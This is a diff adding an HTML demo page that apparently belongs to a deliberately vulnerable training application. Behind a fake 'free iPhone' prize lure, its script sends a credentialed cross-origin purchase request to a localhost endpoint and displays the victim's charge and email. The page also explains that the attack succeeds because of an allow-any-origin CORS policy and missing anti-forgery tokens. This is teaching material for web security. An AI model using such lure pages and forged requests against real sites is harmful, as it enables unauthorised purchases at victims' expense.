@@ -1,0 +1,211 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Innocent Looking Website - Definitely Not Malicious</title>
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
+    <style>
+        body {
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            min-height: 100vh;
+            padding: 40px 0;
+        }
+        .attacker-card {
+            background: white;
+            border-radius: 15px;
+            box-shadow: 0 10px 40px rgba(0,0,0,0.2);
+        }
+        .result-box {
+            background: #f8f9fa;
+            border-left: 4px solid #dc3545;
+            padding: 15px;
+            border-radius: 5px;
+            font-family: 'Courier New', monospace;
+            font-size: 14px;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="attacker-card p-5">
+            <h1 class="text-center mb-4">Win a Free iPhone! Click Below!</h1>
+            <p class="text-center lead text-muted">Congratulations! You've been selected as our lucky visitor!</p>
+            
+
+            <div class="alert alert-warning">
+                <strong>ATTACKER'S NOTE:</strong> This page demonstrates a CSRF attack. 
+                When you click the button below, it will make an unauthorized request to purchase a product 
+                using your authenticated session from the vulnerable application.
+            </div>
+
+            <div class="text-center mb-4">
+                <button id="attackBtn" class="btn btn-danger btn-lg px-5 py-3">
+                    Claim Your Prize Now!
+                </button>
+            </div>
+
+            <div id="result" class="mt-4" style="display: none;">
+                <h5 class="text-danger">Attack Result:</h5>
+                <div class="result-box" id="resultContent"></div>
+            </div>
+
+            <div class="mt-5">
+                <h5>What just happened?</h5>
+                <ol class="small">
+                    <li>You were authenticated to the vulnerable site (localhost:7124)</li>
+                    <li>This malicious page made a cross-origin request to purchase a product</li>
+                    <li>Your browser automatically included authentication cookies</li>
+                    <li>The server accepted the request because there was no CSRF token validation</li>
+                    <li>Money was deducted from your account without your consent!</li>
+                </ol>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        document.getElementById('attackBtn').addEventListener('click', async function() {
+            const resultDiv = document.getElementById('result');
+            const resultContent = document.getElementById('resultContent');
+            
+            resultContent.innerHTML = 'Launching CSRF attack...';
+            resultDiv.style.display = 'block';
+
+            try {
+                console.log('=== CSRF ATTACK ATTEMPT ===');
+                console.log('Attacker origin:', window.location.origin);
+                console.log('Target URL: https://localhost:7124/api/vulnerabilities/csrf/purchase');
+                
+                // CSRF Attack: Cross-origin request with credentials
+                // This works because:
+                // 1. CsrfController has [EnableCors("VulnerablePolicy")]
+                // 2. VulnerablePolicy uses SetIsOriginAllowed(_ => true)
+                // 3. No [ValidateAntiForgeryToken] protection
+                // 4. Browser automatically sends cookies with credentials: 'include'
+                
+                const response = await fetch('https://localhost:7124/api/vulnerabilities/csrf/purchase', {
+                    method: 'POST',
+                    credentials: 'include', // Include cookies from vulnerable site
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({
+                        productName: 'Fake Premium Subscription (Attacker Gets Money)',
+                        amount: 299.99
+                    })
+                });
+
+                console.log('Response status:', response.status);
+                console.log('Response headers:', [...response.headers.entries()]);
+
+                const contentType = response.headers.get('content-type');
+                if (!contentType || !contentType.includes('application/json')) {
+                    const text = await response.text();
+                    throw new Error(`Server returned non-JSON response: ${text.substring(0, 100)}`);
+                }
+
+                const data = await response.json();
+                console.log('Response data:', data);
+
+                if (response.ok && data.success) {
+                    resultContent.innerHTML = `
+<strong> CSRF ATTACK SUCCESSFUL!</strong>
+
+═══════════════════════════════════════
+ATTACK DETAILS:
+═══════════════════════════════════════
+Request made to: https://localhost:7124/api/vulnerabilities/csrf/purchase
+Attacker origin: ${window.location.origin}
+Target origin:   https://localhost:7124
+
+═══════════════════════════════════════
+TRANSACTION DETAILS:
+═══════════════════════════════════════
+Product purchased: ${data.message}
+Amount charged:    $${data.amount}
+Remaining balance: $${data.newBalance}
+Victim email:      ${data.userEmail}
+
+═══════════════════════════════════════
+WHY THIS ATTACK WORKED:
+═══════════════════════════════════════
+✓ CORS policy allows ANY origin (SetIsOriginAllowed(_ => true))
+✓ No anti-forgery token was validated
+✓ Browser automatically sent authentication cookies
+✓ Server couldn't distinguish legitimate vs malicious requests
+✓ Attacker can now claim the $${data.amount} payment!
+
+═══════════════════════════════════════
+WHAT THE ATTACKER ACHIEVED:
+═══════════════════════════════════════
+• Unauthorized purchase made without victim's consent
+• Money deducted from victim's account
+• Victim doesn't even know it happened
+• Attacker gets the paid service/product
+• This could be repeated multiple times
+
+⚠ This is a critical CSRF vulnerability!
+                    `;
+                } else {
+                    resultContent.innerHTML = `
+<strong>Attack partially failed</strong>
+
+Server response: ${data.error || data.message || 'Unknown error'}
+Balance: $${data.balance || 'N/A'}
+
+The server processed the request but rejected it.
+This might be due to insufficient funds or other validation.
+
+However, note that:
+- The cross-origin request WAS allowed
+- The server DID process the malicious request
+- Only business logic prevented the attack
+- CSRF protection is still MISSING!
+                    `;
+                }
+            } catch (error) {
+                console.error('❌ Attack failed:', error);
+                
+                resultContent.innerHTML = `
+<strong>❌ Attack Failed</strong>
+
+Error: ${error.message}
+
+═══════════════════════════════════════
+POSSIBLE REASONS:
+═══════════════════════════════════════
+• CORS policy blocked the request
+• Network error occurred
+• The vulnerable site is not running on https://localhost:7124
+• Server returned non-JSON response
+
+═══════════════════════════════════════
+TROUBLESHOOTING:
+═══════════════════════════════════════
+1. Check browser console (F12) for detailed error messages
+2. Verify target app is running on https://localhost:7124
+3. Check Network tab for the request details
+4. Look for CORS headers in the response
+5. Ensure CsrfController has [EnableCors("VulnerablePolicy")]
+6. Verify Program.cs has UseCors("VulnerablePolicy")
+
+═══════════════════════════════════════
+IMPORTANT NOTE:
+═══════════════════════════════════════
+Even if CORS blocks reading the response, 
+the CSRF attack may still succeed on the server side!
+
+The server might have:
+- Processed the purchase
+- Deducted money from the account
+- Created the order
+
+But the attacker cannot read the response due to CORS.
+This is why CSRF protection (anti-forgery tokens) is needed
+EVEN WITH proper CORS configuration!
+                `;
+            }
+        });
+    </script>
+</body>
+</html>
